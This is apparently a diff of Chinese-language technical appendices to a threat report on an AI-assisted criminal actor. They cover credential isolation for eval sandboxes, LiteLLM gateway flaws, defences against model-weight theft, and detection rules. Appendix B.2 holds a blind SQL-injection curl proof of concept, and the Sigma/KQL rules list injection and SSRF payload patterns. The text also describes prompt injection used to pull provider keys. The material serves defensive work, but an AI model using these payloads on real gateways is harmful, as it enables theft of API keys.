+把「執行不可信內容的元件」與「持有憑證的元件」放進<strong>不同信任邊界</strong>。不可信執行區以<strong>無憑證、唯讀根檔系統、非 root、drop 全部 Linux capabilities、無網路或嚴格 egress allowlist</strong> 執行；真正的金鑰只存在外層 <strong>credential broker / egress proxy</strong>。沙箱只發「我要呼叫供應商 X 做 Y」的抽象請求，由 broker 代持金鑰、代呼叫、代限流——<strong>沙箱從頭到尾看不到金鑰明文</strong>。</p>
+<p><strong>（2）短期、範圍受限憑證——把「一次得手」的價值歸零</strong><br />
+即使 broker 要下放某種 token，也用 <strong>workload identity（OIDC federation）／STS <code>AssumeRole</code>／每個 eval run 一把、TTL 分鐘級</strong>的短期憑證，而非長效供應商主金鑰。這樣就算被吐出來，攻擊者拿到的是一把幾分鐘後即失效、且只能呼叫特定路由的 token——這直接瓦解本案第 4.3 節「自動換槍」能長期使用受害者金鑰的前提。</p>
+<p><strong>（3）Egress 控制——default-deny 出站 + DLP</strong><br />
+沙箱出站一律 <strong>default-deny，只 allowlist 必要供應商網域</strong>；配 DNS 過濾與<strong>出站 DLP</strong>（偵測金鑰樣態的封包）。這條同時擋掉 A.2 的三種外洩通道。</p>
+<pre class="mermaid">flowchart LR
+    subgraph UNTRUST[&quot;不可信執行區 (無憑證/唯讀/非root/drop caps)&quot;]
+        T[&quot;待測模型輸出 / 外部任務 / 工具呼叫&quot;]
+        W[&quot;Eval worker&quot;]
+    end
+    subgraph EGRESS[&quot;Egress 控制層&quot;]
+        P[&quot;出站 Proxy: default-deny + allowlist&quot;]
+        D[&quot;出站 DLP: 金鑰樣態偵測&quot;]
+    end
+    subgraph TRUST[&quot;持憑證協調區 (broker)&quot;]
+        B[&quot;Credential Broker&lt;br/&gt;每 run 短期/範圍受限憑證&quot;]
+    end
+    PROV[&quot;供應商 API&quot;]
+    T --&gt; W
+    W --&gt;|&quot;只發抽象請求, 不碰金鑰&quot;| B
+    B --&gt;|&quot;STS/OIDC 短期憑證&quot;| P
+    P --&gt; D --&gt; PROV
+    W -. &quot;任何直接出站一律阻擋+告警&quot; .-&gt; P
+</pre>
+<p><strong>（4）偵測——三道防守方可直接落地的規則</strong></p>
+<p><em>規則 A-1：模型輸出／eval log 中出現供應商金鑰材料（把金鑰當 canary）。</em> 任何情況下金鑰都不該出現在模型輸出或評測日誌，命中即高信度失陷：</p>
+<pre><code class="language-yaml">title: Provider API key material in model output / eval log
+id: a1c0-50020-evalkey-exfil
+status: experimental
+logsource:
+  product: ai_platform
+  service: eval_sandbox
+detection:
+  keys:
+    message|re: '(sk-ant-[A-Za-z0-9_\-]{20,}|sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_\-]{35}|xai-[A-Za-z0-9]{20,})'
+  condition: keys
+level: critical
+falsepositives:
+  - 刻意植入的 canary/honeytoken 金鑰（應改為專屬告警而非抑制）
+</code></pre>
+<p><em>規則 A-2：沙箱程序出站到非白名單端點。</em> 於 egress proxy 或 eBPF/網路遙測上，對「沙箱來源 → 非 allowlist 目的地」的任何連線告警——尤其是帶長 query string 或 POST body 到未知網域者（對應 A.2 的編碼外洩）。</p>
+<h1 id="blitellm-openclaw-ai-gateway">附錄 B：LiteLLM / OpenClaw 類 AI gateway 的錯誤設定與竊金鑰（技術深化）</h1>
+<blockquote>
+<p>對應第 9.3、12.4 節的紀律：報告 p.29 把「用 prompt injection 從 LiteLLM 竊生產金鑰」明確歸給「<strong>multiple actors（多名行為者）</strong>」，<strong>並未</strong>斷言就是 GTG-50020；而 GTG-50020 被點名的是「<strong>評測沙箱</strong>」注入（附錄 A）。本附錄把 LiteLLM 當作「與本案同型的 AI gateway 攻擊面」深化，<strong>不做過度歸因</strong>。</p>
+</blockquote>
+<h2 id="b1-ai-gateway">B.1 AI gateway 的憑證存放模型與典型錯誤設定</h2>
+<p>以 LiteLLM Proxy 為例，一個 AI gateway 實際持有兩層祕密，兩層都是攻擊者的目標：</p>
+<ul>
+<li><strong>虛擬金鑰（virtual keys，<code>sk-...</code>）</strong>：下游應用拿來呼叫 gateway 的憑證，DB 內以 <strong>SHA-256 hash</strong> 存放（<code>LiteLLM_VerificationToken</code> 表）。</li>
+<li><strong>上游供應商生產金鑰（upstream provider keys）</strong>：gateway 代呼叫 OpenAI/Anthropic/Gemini 時用的<strong>真金鑰</strong>，存在 DB／設定，理想上以 <code>LITELLM_SALT_KEY</code> 加密於靜態。<strong>這才是報告所稱「production API keys from multiple providers」的本體。</strong></li>
+</ul>
+<p>常見錯誤設定（=一份現成的稽核清單，補足第 10.4B）：</p>
+<table>
+<thead>
+<tr>
+<th>錯誤設定</th>
+<th>為何危險</th>
+<th>技術修法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>上游金鑰 / master key 放<strong>環境變數</strong>或明文設定檔</td>
+<td>被攻陷的程序（或 SSRF/RCE）一把撈走；與附錄 A.2 同構</td>
+<td>移進 Vault / 雲端 Secrets Manager，程序執行期才注入且不可被子程序讀</td>
+</tr>
+<tr>
+<td><code>LITELLM_SALT_KEY</code> 未設或使用預設</td>
+<td>DB 外洩時上游金鑰即以<strong>可解密／明文</strong>形式外流</td>
+<td>設定強隨機 SALT_KEY 並輪替；假設 DB 終會外洩來設計</td>
+</tr>
+<tr>
+<td><strong>verbose / debug logging</strong> 把 request headers、body 落地</td>
+<td><code>Authorization</code> 標頭、金鑰被寫進日誌與 APM，橫向擴散</td>
+<td>關閉 debug；對日誌做 secret redaction；金鑰欄位遮罩</td>
+</tr>
+<tr>
+<td>管理 UI、<code>/mcp-rest/test/*</code> 等<strong>測試端點對外</strong></td>
+<td>直接 RCE/命令注入面（見 B.3）</td>
+<td>放零信任後、限來源 IP、生產環境停用測試端點</td>
+</tr>
+<tr>
+<td>虛擬金鑰 <code>allowed_routes</code> 給 <code>/*</code>、無用量上限</td>
+<td>一把被偷即全盤皆輸、且無異常上限攔截</td>
+<td>每下游一把、限定 <code>allowed_routes</code>、設 budget/rate limit</td>
+</tr>
+</tbody>
+</table>
+<h2 id="b2-cve-2026-42208-poc">B.2 CVE-2026-42208 深潛：利用原理、受影響版本、PoC 形狀、偵測</h2>
+<p>這是本案期間最具代表性的 AI gateway 漏洞，<strong>未認證即可竊取 gateway 所代管的全部上游金鑰</strong>，正是「憑證保險庫」被一次掏空的教科書案例。</p>
+<ul>
+<li><strong>漏洞類型 / 評分</strong>：LiteLLM Proxy 認證路徑的 <strong>pre-auth SQL injection</strong>，CVSS <strong>9.3</strong>。</li>
+<li><strong>受影響版本</strong>：<strong>v1.81.16 – v1.83.6</strong>；<strong>修補於 v1.83.7-stable</strong>（官方建議升級 <strong>v1.83.10-stable</strong>）。</li>
+<li><strong>根因（parameterization failure）</strong>：<code>litellm/proxy/utils.py</code> 的 <code>PrismaClient.get_data()</code> 用 <strong>f-string 內插</strong>組 SQL：<code>WHERE v.token = '{token}'</code>——把呼叫者可控的 bearer 值<strong>直接內插</strong>進查詢字串，而非以參數綁定。</li>
+<li><strong>未認證可達路徑（pre-auth reachability）</strong>：任何 LLM 路由皆可觸發——<code>/v1/chat/completions</code>、<code>/v1/completions</code>、<code>/v1/messages</code>、<code>/v1/embeddings</code>。當 bearer 格式驗證失敗丟出 <code>AssertionError</code>，被<strong>泛型例外處理器</strong>接住並呼叫 <code>_enrich_failure_metadata_with_key_info()</code>，該函式又以<strong>原始、未清洗</strong>的 bearer 呼叫 <code>get_data()</code>，<strong>繞過</strong>了原本會對 <code>sk-</code> 前綴金鑰做 hash／清洗的機制。</li>
+<li><strong>注入標的</strong>：<code>LiteLLM_VerificationToken</code> 資料表及其 join 的 team/budget/org 表；經盲注可讀 proxy DB 任意資料表——<strong>包含儲存上游供應商金鑰的資料表</strong>（若 <code>SALT_KEY</code> 缺失或一併洩漏即成可用金鑰）。</li>
+<li><strong>PoC 形狀（時間盲注）</strong>：</li>
+</ul>
+<pre><code class="language-bash">curl -X POST https://TARGET/v1/chat/completions \
+  -H &quot;Authorization: Bearer ' OR (SELECT pg_sleep(6)) IS NULL -- &quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;model&quot;:&quot;x&quot;,&quot;messages&quot;:[{&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;x&quot;}]}'
+# 有漏洞主機: 約 6 秒後回 HTTP 401(延遲即時間旁路訊號)；已修補主機: &lt;100ms
+</code></pre>
+<ul>
+<li><strong>修補機制</strong>：改為參數化查詢 <code>WHERE v.token = $1</code>，hash 後的 token 以獨立參數傳入。</li>
+<li><strong>野外利用時間差</strong>：GitHub 公告後<strong>約 36 小時</strong>即觀測到野外針對性利用——說明「AI gateway 一有公告就要當緊急事件處理」。</li>
+</ul>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    actor ATK as 未認證攻擊者
+    participant EP as LiteLLM /v1/chat/completions
+    participant AUTH as bearer 格式驗證
+    participant EH as 泛型例外處理器
+    participant DB as Postgres LiteLLM_VerificationToken
+    ATK-&gt;&gt;EP: POST + Authorization Bearer 含 SQLi payload
+    EP-&gt;&gt;AUTH: 驗證 bearer
+    AUTH--&gt;&gt;EP: AssertionError (格式不符)
+    EP-&gt;&gt;EH: 例外被泛型處理器接住
+    Note over EH: 呼叫 _enrich_failure_metadata_with_key_info()&lt;br/&gt;以原始 token 再呼叫 get_data()
+    EH-&gt;&gt;DB: f-string 內插: WHERE v.token = &#x27;{token}&#x27;
+    Note over DB: 未參數化 → SQL injection&lt;br/&gt;回應延遲約 6s = 盲注時間旁路
+    DB--&gt;&gt;ATK: 可讀任意資料表(含上游供應商金鑰資料表)
+</pre>
+<p><strong>偵測（可直接部署，需依自家反向代理調整）</strong>：</p>
+<ul>
+<li><strong>WAF 規則（ModSecurity 風格）</strong>：凡 <code>Authorization</code> 標頭不符合合法金鑰格式即擋。因為合法 bearer 一定是 <code>sk-...</code>，任何含 <code>'</code>、<code>--</code>、<code>SELECT</code>、<code>pg_sleep</code> 的 bearer 都是攻擊：</li>
+</ul>
+<pre><code>SecRule REQUEST_HEADERS:Authorization &quot;!@rx ^Bearer\s+sk-[A-Za-z0-9_\-]+$&quot; \
+  &quot;id:1426042208,phase:1,deny,status:401,log,\
+   msg:'LiteLLM CVE-2026-42208: malformed Bearer token (possible pre-auth SQLi)'&quot;
+</code></pre>
+<ul>
+<li><strong>時間旁路偵測</strong>：對 <code>/v1/*</code> 認證失敗（401）路徑做<strong>回應延遲異常</strong>監控——正常認證失敗 &lt;100ms，出現規律性的數秒延遲即疑似時間盲注（Bishop Fox 指出 timing 是此漏洞唯一穩定的外部訊號）。</li>
+<li><strong>日誌訊號</strong>：<code>Authorization</code> bearer 格式相關的 assertion 例外突增（需先建立基線，否則與良性 client 設定錯誤難分）。</li>
+</ul>
+<h2 id="b3-rce-openclaw">B.3 未認證 RCE 串鏈與 OpenClaw 生態（補充）</h2>
+<ul>
+<li><strong>未認證 RCE 串鏈</strong>：<strong>CVE-2026-42271</strong>（MCP 測試端點命令注入，CVSS 8.7）＋ <strong>CVE-2026-48710「BadHost」</strong>（Starlette <code>Host</code> 標頭認證繞過）可串成<strong>未認證 RCE</strong>——先用 BadHost 繞過認證、再打 MCP 測試端點注入命令。加上權限提升鏈（CVE-2026-47101/47102/40217）、SSTI（CVE-2026-42203）與 <strong>TeamPCP</strong> 於 2026-03 對 PyPI 投毒 <code>v1.82.7/1.82.8</code> 竊雲端金鑰/K8s token，構成一整組 gateway 供應鏈風險（詳見第 9.3 節）。</li>
+<li><strong>OpenClaw</strong>：報告 p.12 把「prompt injection of LiteLLM or <strong>OpenClaw</strong> deployments」列為機會型攻擊之一。公開研究顯示其控制台大量公網暴露（一次掃描 42,665 個實例、93.4% 認證可繞過）、MoltBot 事件洩漏 150 萬把明文 API 金鑰——與 B.1 的「金鑰不落地、控制台不裸奔」修法直接相關。</li>
+</ul>
+<h1 id="c">附錄 C：模型權重竊取的威脅建模與技術防護（技術深化）</h1>
+<blockquote>
+<p>補足第 4.7 節（概念層）到「可據以設計防護」的技術層。本案是<strong>非國家、財務動機</strong>攻擊者發起的權重竊取嘗試，對應 RAND 的 <strong>OC3</strong>（組織型網路犯罪／內部威脅）。</p>
+</blockquote>
+<h2 id="c1-rand-sloc">C.1 RAND SL/OC 分級對照（技術版）</h2>
+<p>RAND《Securing AI Model Weights》(RRA2849-1, 2024) 把「攻擊者能力」分成 <strong>OC1–OC5</strong> 五級、把「防護強度」分成 <strong>SL1–SL5</strong> 五級，並識別 <strong>9 大類攻擊向量</strong>；後續《Achieving SL3》(RRA4704-1, 2026-08) 以 <strong>NIST SP 800-53 Rev 5</strong> 為基礎給出 <strong>262 條控制</strong>、涵蓋 <strong>31 個高可行性攻擊向量（9 大類）</strong>、共 <strong>3,361 條 control-to-threat 映射</strong>，設計為 <strong>6–12 個月</strong>可落地：</p>
+<table>
+<thead>
+<tr>
+<th>等級</th>
+<th>攻擊者能力（OC）／防護目標（SL）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OC1 / SL1</td>
+<td>業餘者、機會型；基本資安即可防</td>
+</tr>
+<tr>
+<td>OC2 / SL2</td>
+<td>較有經驗的個人／小團體</td>
+</tr>
+<tr>
+<td><strong>OC3 / SL3</strong></td>
+<td><strong>組織型網路犯罪、內部威脅、資源充足的恐怖組織</strong>——<strong>GTG-50020 落在此級</strong>；SL3=262 控制即針對此級</td>
+</tr>
+<tr>
+<td>OC4 / SL4</td>
+<td>一般國家級行為者</td>
+</tr>
+<tr>
+<td>OC5 / SL5</td>
+<td>頂尖國家級、投入最大資源</td>
+</tr>
+</tbody>
+</table>
+<p><strong>本案的驗證意義</strong>：Anthropic 的 <strong>RSP / ASL-3</strong> 明訂要「硬化安全，使<strong>非國家攻擊者難以竊取</strong>模型權重、<strong>國家級攻擊者非付出重大代價無法竊取</strong>」——目標區間正是防到 OC3。本案中「核心系統未失守、每條途徑皆失敗」（p.31）即是這條門檻<strong>對一個 OC3 級財務動機犯罪者有效</strong>的實證；但攻擊者動機密度（4 天打 30 家）已明顯升高。</p>
+<h2 id="c2">C.2 皇冠寶石的技術防護分層（存取控制 / 金絲雀 / 外洩偵測）</h2>
+<pre class="mermaid">flowchart TB
+    ATT[&quot;攻擊者 (OC3: 組織型犯罪/內部威脅)&quot;]
+    subgraph L1[&quot;1) 存取控制層&quot;]
+        A1[&quot;權重存於隔離 store, 無常設存取(JIT)&quot;]
+        A2[&quot;硬體綁定驗證 + 兩人控制(two-person)&quot;]
+        A3[&quot;權重端點與一般網路實體/邏輯隔離&quot;]
+    end
+    subgraph L2[&quot;2) 金絲雀 / 溯源層&quot;]
+        C1[&quot;Canary 權重檔 + honeytoken 散佈於權重目錄&quot;]
+        C2[&quot;模型水印 / 後門觸發指紋(證明來源)&quot;]
+    end
+    subgraph L3[&quot;3) 外洩偵測層&quot;]
+        E1[&quot;Egress 頻寬監控: 權重 TB 級, 大量出站即異常&quot;]
+        E2[&quot;Interconnect / DLP + 上傳到外部端點告警&quot;]
+    end
+    ATT --&gt; L1 --&gt; L2 --&gt; L3 --&gt; SOC[&quot;SOC 高優先告警&quot;]
+</pre>
+<ul>
+<li><strong>存取控制（防「拿到」）</strong>：權重存放於與一般開發網路隔離的 store；採 <strong>JIT（just-in-time）無常設存取</strong>、<strong>硬體綁定驗證</strong>與<strong>兩人控制</strong>（two-person integrity），使單一被盜憑證或單一內部人無法獨力搬走權重。</li>
+<li><strong>金絲雀 / 溯源（防「拿到後無感」＋事後證明）</strong>：在權重目錄散佈 <strong>canary 檔與 honeytoken</strong>——正常作業永不觸碰，一旦被讀取／外傳即高信度告警；並對發布模型植入<strong>水印或後門式溯源指紋</strong>，用於外流後<strong>證明來源</strong>（呼應報告蒸餾章節「難以證明來源」的痛點）。</li>
+<li><strong>外洩偵測（防「搬得走」）</strong>：前沿模型權重是 <strong>TB 級</strong>檔案，這反而是防守優勢——<strong>egress 頻寬監控</strong>能讓「一次大量出站」變得極其顯眼；配 <strong>interconnect 監控、DLP、對外上傳異常告警</strong>，把「終局式的一次外洩」轉成可攔截事件。</li>
+</ul>
+<h2 id="c3">C.3 「一次得手即終局」對偵測策略的意涵</h2>
+<p>因為權重外流<strong>無法打補丁、無法收回、載入即得等價能力</strong>（第 4.7 節對照表），偵測的重心必須從「事後回應」前移到「<strong>外傳當下即阻斷</strong>」：頻寬硬上限、預設拒絕的權重端點出站、對「大檔案 + 外部目的地」零容忍告警。這與一般資料外洩「可事後輪替」的處置邏輯根本不同——<strong>權重防護沒有第二次機會</strong>。</p>
+<h1 id="dfigure-15-vs-figure-16-siem">附錄 D：Figure 15 vs Figure 16 的 SIEM 日誌層差異與偵測規則（技術深化）</h1>
+<blockquote>
+<p>把第 6.4 節的概念對照，落到「SIEM 裡實際會出現的欄位與時序特徵」，並交付<strong>一條 Sigma + 一條 KQL</strong> 偵測「機器速度自主利用」（對應任務要求）。</p>
+</blockquote>
+<h2 id="d1">D.1 兩種操作在日誌上的可觀測差異（欄位級對照）</h2>
+<table>
+<thead>
+<tr>
+<th>可觀測維度</th>
+<th>Fig. 15 人類逐步指揮</th>
+<th>Fig. 16 全自主管線</th>
+<th>主要日誌欄位</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>請求間隔（inter-arrival）</td>
+<td>不規則、含人類思考停頓</td>
+<td><strong>近似固定、低抖動（低 stddev）</strong></td>
+<td><code>timestamp</code> 差分、<code>gap_ms</code></td>
+</tr>
+<tr>
+<td>節律（cadence）</td>
+<td>批次性：一叢 dispatch 後有審查停頓</td>
+<td><strong>連續均勻</strong></td>
+<td>每分鐘/小時請求數</td>
+</tr>
+<tr>
+<td>晝夜性（diel）</td>
+<td>停頓落在人類作息（睡眠/上下班）</td>
+<td><strong>24/7 無空窗</strong></td>
+<td><code>bin(timestamp,1h)</code> 覆蓋小時數</td>
+</tr>
+<tr>
+<td>平行度</td>
+<td>受人類審查節奏限制</td>
+<td><strong>極高並發</strong></td>
+<td>同源同時連線數、<code>c-ip</code> 聚合</td>
+</tr>
+<tr>
+<td>重試樣態</td>
+<td>收斂（人類砍無用路徑）</td>
+<td><strong>盲目窮舉、固定順序</strong></td>
+<td><code>uri</code>、<code>status</code> 序列</td>
+</tr>
+<tr>
+<td>攻擊類別分布</td>
+<td>依判斷跳躍</td>
+<td><strong>同劇本掃過多類</strong>（SQLi/XSS/authbypass/SSRF）</td>
+<td><code>cs-uri-query</code> 特徵</td>
+</tr>
+<tr>
+<td>發起訊號</td>
+<td>離散發起點（每次 slash command + 讀 scope 檔）</td>
+<td>一次上線後長時間自走</td>
+<td>工作啟動事件、檔案存取</td>
+</tr>
+<tr>
+<td>來源指紋</td>
+<td>隨人類環境</td>
+<td>常見<strong>單一 UA / 固定 JA3/JA4</strong></td>
+<td><code>cs-user-agent</code>、TLS 指紋</td>
+</tr>
+</tbody>
+</table>
+<p><strong>一句話</strong>：自主程度不改變「用了哪些技術」，但徹底改變「在日誌上的形狀」——偵測要抓 <strong>machine speed（低間隔）＋ uniform cadence（低抖動）＋ no diel gap（跨晝夜）＋ multi-class（同源多攻擊類）</strong> 這四個「AI 編排的形狀」。</p>
+<h2 id="d2-sigma-event_count">D.2 Sigma 規則：機器速度自主利用（event_count 關聯）</h2>
+<pre><code class="language-yaml"># 基礎規則：任一注入類別探測
+title: Web application injection probe (any class)
+name: web_injection_probe
+status: experimental
+logsource:
+  category: webserver
+detection:
+  probe:
+    cs-uri-query|re: '(?i)(''\s+or\s+|union\s+select|sleep\(|pg_sleep|&lt;script|onerror=|\.\./|%2e%2e%2f|gopher://|file://|169\.254\.169\.254)'
+  condition: probe
+---
+# 關聯規則：單一來源在 5 分鐘內達到機器速度的探測量
+title: Machine-speed autonomous exploitation cadence (GTG-50020 / Fig.16)
+status: experimental
+correlation:
+  type: event_count
+  rules:
+    - web_injection_probe
+  group-by:
+    - c-ip
+  timespan: 5m
+  condition:
+    gte: 300
+level: high
+falsepositives:
+  - 獲授權的 DAST 掃描器(Burp/ZAP/Nuclei)——以來源 IP allowlist 排除
+  - 對 in-scope 資產的 bug-bounty 測試
+</code></pre>
+<h2 id="d3-kql-velocity">D.3 KQL 規則：多特徵版（velocity + 低抖動 + 跨晝夜 + 多類別）</h2>
+<p>KQL 更適合表達「四個形狀」的複合邏輯。假設已把 web 存取日誌正規化為 <code>WebAccessLogs</code>（欄位名請依自家 schema 調整）：</p>
+<pre><code class="language-kql">// Fig.16 &quot;No human in the loop&quot; 利用節律偵測
+let window = 24h;
+WebAccessLogs
+| where TimeGenerated &gt; ago(window)
+| extend attack_class = case(
+    RequestUri matches regex @&quot;(?i)('\s+or\s+|union\s+select|sleep\(|pg_sleep|benchmark\()&quot;, &quot;sqli&quot;,
+    RequestUri matches regex @&quot;(?i)(&lt;script|onerror\s*=|javascript:)&quot;,                      &quot;xss&quot;,
+    RequestUri matches regex @&quot;(?i)(\.\./|%2e%2e%2f|\.\.%2f)&quot;,                               &quot;path_traversal&quot;,
+    RequestUri matches regex @&quot;(?i)(gopher://|file://|dict://|169\.254\.169\.254|metadata\.google)&quot;, &quot;ssrf&quot;,
+    RequestUri matches regex @&quot;(?i)(/admin|/api).*(--|%27|')&quot;,                               &quot;authbypass&quot;,
+    &quot;none&quot;)
+| where attack_class != &quot;none&quot;
+| order by ClientIP asc, TimeGenerated asc
+| extend gap_ms = iff(prev(ClientIP) == ClientIP,
+                      datetime_diff('millisecond', TimeGenerated, prev(TimeGenerated)), long(null))
+| summarize
+    requests       = count(),
+    attack_classes = dcount(attack_class),
+    targets        = dcount(HostName),
+    active_hours   = dcount(bin(TimeGenerated, 1h)),
+    median_gap_ms  = percentile(gap_ms, 50),
+    gap_stddev_ms  = stdev(gap_ms)
+    by ClientIP
+| where requests &gt; 500                     // 持續量能
+    and attack_classes &gt;= 3                 // 多類別, 非單一掃描器特徵
+    and active_hours &gt;= 8                   // 跨晝夜——無人類作息空窗
+    and median_gap_ms &lt; 1500                // 機器速度
+    and gap_stddev_ms &lt; median_gap_ms       // 低抖動=自動化的均勻節律
+| project ClientIP, requests, attack_classes, targets, active_hours, median_gap_ms, gap_stddev_ms
+</code></pre>
+<p><strong>調參與誤報說明</strong>：<code>requests/active_hours/median_gap_ms</code> 三個門檻需先跑 7 天基線校準；授權掃描器與 CDN/WAF 健康檢查要 allowlist；<code>gap_stddev_ms &lt; median_gap_ms</code>（變異係數 &lt; 1）是「均勻節律」的關鍵鑑別特徵——人類驅動的流量抖動通常遠大於此。此規則刻意<strong>不依賴任何 IP/雜湊 IOC</strong>（那些會腐壞），而是抓第 7.3 節所述位於 Pyramid of Pain 頂端的「行為形狀」。</p>
+<h1 id="ekyc-antidetect-browser">附錄 E：KYC 攔截斗篷與 antidetect browser 的技術機制與金融偵測（技術深化）</h1>
+<blockquote>
+<p>深化 Fig. 17（合成身分量產）與 Fig. 18（劫持真身分驗證）的技術層，並給金融業可落地的偵測。</p>
+</blockquote>
+<h2 id="e1-aitm-fig-18">E.1 AiTM 反向代理（Fig. 18）技術機制與偵測</h2>
+<p>Fig. 18 的本質是把 <strong>evilginx2 類 AiTM（adversary-in-the-middle）反向代理</strong>（MITRE ATT&amp;CK 軟體 <strong>S9003</strong>）用在 <strong>KYC 流程</strong>上。其致命處在於偷的是 <strong>post-authentication session</strong>，而非密碼——所以能<strong>繞過 MFA 與 liveness</strong>：</p>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    actor V as 受害者
+    participant LK as 仿冒驗證網域(反向代理)
+    participant EX as 真實交易所 KYC
+    actor OP as 操作者
+    V-&gt;&gt;LK: 連上 lookalike 網域開始 KYC
+    LK-&gt;&gt;EX: 反向代理原封轉發真實 KYC 流程
+    EX--&gt;&gt;LK: 回傳頁面/挑戰(含 liveness/MFA)
+    LK--&gt;&gt;V: 原封回傳, 受害者看不出異狀且真的通過
+    Note over LK: 中途攔截已驗證 session cookie/token 與上傳證件
+    LK-&gt;&gt;OP: 交付已通過 KYC 的 session + 文件
+    OP-&gt;&gt;EX: 用攔得 session 從自有機器接管
+    Note over OP,EX: 偷的是 post-auth 狀態, 故繞過 MFA/liveness
+</pre>
+<p><strong>金融業偵測（可落地）</strong>：</p>
+<ul>
+<li><strong>Certificate Transparency（CT）日誌監控</strong>：AiTM 反向代理常用 Let's Encrypt 自動簽發 lookalike 網域憑證，<strong>在第一封釣魚信寄出前數小時</strong>就在 CT log 留痕。持續監控「與自家登入/驗證入口相似」的新簽發憑證（含 IDN 同形域名，見第 9.4 節 Booking.com 在台案例的西里爾 <code>о</code>）。</li>
+<li><strong>伺服器端 session 一致性</strong>：同一「已驗證 session」若從<strong>註冊地以外的 IP/ASN/裝置指紋</strong>被使用、或 <strong>liveness 完成後裝置指紋突變</strong>，即疑似 relay 接管。KQL 範例：</li>
+</ul>
+<pre><code class="language-kql">// 同一已驗證 session 被多來源使用(AiTM/KYC-cloak 接管訊號)
+SessionEvents
+| where TimeGenerated &gt; ago(7d)
+| summarize asns=dcount(Asn), geos=dcount(Country), devfps=dcount(DeviceFp),
+            first=min(TimeGenerated), last=max(TimeGenerated),
+            ip_list=make_set(ClientIP,20)
+    by SessionId, UserId
+| where asns &gt;= 2 or devfps &gt;= 2               // 一個已驗證 session, &gt;=2 來源/裝置
+| extend span_min = datetime_diff('minute', last, first)
+| where span_min &lt; 60                          // 一小時內換源=relay 接管, 非真人移動
+| project UserId, SessionId, asns, geos, devfps, span_min, ip_list
+</code></pre>
+<ul>
+<li><strong>抗釣魚 MFA</strong>：FIDO2/WebAuthn 的 <strong>origin binding + channel binding</strong> 使憑證綁定在真實網域，反向代理無法中繼；配 <strong>Continuous Access Evaluation（CAE）</strong> 縮短 session 竊取後的可用窗。這是對 Fig. 18 唯一的根本解——因為它讓「攔到的 session」在錯誤 origin 上無效。</li>
+</ul>
+<h2 id="e2-antidetect-browser-fig-17">E.2 antidetect browser + 住宅代理（Fig. 17）技術機制與偵測</h2>
+<p>antidetect 瀏覽器（Multilogin、GoLogin、Dolphin Anty 等，多用<strong>改過的真實瀏覽器引擎</strong>而非自動化框架，故最難偵測）的原理，是<strong>逐 profile 偽造整組指紋面</strong>，讓每個詐欺帳號都有一致的合成身分：</p>
+<table>
+<thead>
+<tr>
+<th>指紋面</th>
+<th>偽造方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Canvas</td>
+<td>像素層加噪，產生每 profile 穩定但獨特的 canvas hash</td>
+</tr>
+<tr>
+<td>WebGL</td>
+<td>竄改 renderer/vendor 字串，給合成但看似合理的 GPU 身分</td>
+</tr>
+<tr>
+<td>AudioContext</td>
+<td>注入雜訊，產生每 profile 穩定的合成音訊指紋</td>
+</tr>
+<tr>
+<td>Fonts / UA / Timezone / Screen / hardwareConcurrency / navigator</td>
+<td>逐項覆寫成一致的假值</td>
+</tr>
+</tbody>
+</table>
+<p><strong>偵測關鍵＝內部一致性，而非單一訊號</strong>（2026 業界共識）：</p>
+<ul>
+<li><strong>不自洽的偽造比不偽造更好抓</strong>：只改 canvas 卻漏改 WebGL、宣稱的<strong>時區/語言與 IP 地理不符（timezone-to-IP coherence）</strong>、UA 宣稱的 OS 與其他 JS 訊號矛盾——這些「內部矛盾」是最強的偵測訊號。</li>
+<li><strong>網路層指紋壓過 JS 層</strong>：<strong>TLS 指紋（JA3/JA4）</strong> 由底層引擎決定、瀏覽器<strong>難以偽造</strong>——當 JA4 對應的引擎與 UA 宣稱的瀏覽器不符，即高信度自動化/偽裝。2026 趨勢是「JS 訊號在腐蝕、網路訊號上升」。</li>
+<li><strong>住宅代理的假設要翻轉</strong>：住宅 IP 不再等於「真人、低風險」（學術研究曾以滲透框架偵測到 600 萬個住宅代理 IP、跨 230+ 國）。對「來自已知住宅代理池、且行為與帳戶歷史不符」的登入要提高審查——把<strong>行為 + 網路 + 裝置</strong>三層綜合，而非單看 IP 黑名單。</li>
+</ul>
+<p><strong>Fig. 17 vs Fig. 18 合看</strong>：Fig. 17 是<strong>大量製造假身分</strong>（合成一致性可被內部矛盾抓破），Fig. 18 是<strong>劫持真身分的驗證成果</strong>（要靠 session 層與 CT log 抓）——兩條路都終結在「一批可信帳號/session 庫存」，金融風控必須兩面都設偵測。</p>
+<h1 id="f-mermaid">附錄 F：關鍵流程 Mermaid 全圖（技術深化）</h1>
+<h2 id="f1-w5w4-loot-compute-cover">F.1 W5→W4 金鑰閉環（Loot / Compute / Cover）</h2>
+<p>本案全案樞紐：竊得的供應商金鑰（W5）回流成 W4 的原料，再驅動對其他目標的攻擊，形成「別人付費、掛別人名」的閉環。</p>
+<pre class="mermaid">flowchart LR
+    W5[&quot;W5 AI-vendor intrusion&lt;br/&gt;竊供應商生產金鑰&quot;] --&gt;|&quot;stolen provider keys&quot;| W4[&quot;W4 Stolen-data processing&lt;br/&gt;活性檢查/語料充實(1,300+ keys)&quot;]
+    W4 --&gt;|&quot;可用金鑰併入營運池&quot;| POOL[&quot;受害者金鑰池&quot;]
+    POOL --&gt;|&quot;自動換槍(第4.3節)&quot;| OPS[&quot;對其他目標的攻擊工作負載&quot;]
+    OPS --&gt;|&quot;Compute+Cover: 別人付費且掛別人名&quot;| W5
+    POOL -.-&gt;|&quot;Loot: 黑市轉售&quot;| MKT[&quot;地下市場&quot;]
+</pre>
+<h2 id="f2-w1w10-p31">F.2 儀表板 W1–W10「能力 → 行動」供應關係（重畫 p.31 儀表板核心）</h2>
+<p>把 p.31 儀表板左兩欄的橘色供應箭頭抽象成有向圖，一眼看出「同一套 AI 能力被重複供應給十個垂直領域的行動」：</p>
+<pre class="mermaid">flowchart LR
+    subgraph CAP[&quot;AI 能力工作流 (W1-W4)&quot;]
+        W1[&quot;W1 惡意程式/工具開發&quot;]
+        W2[&quot;W2 平台與基礎設施&quot;]
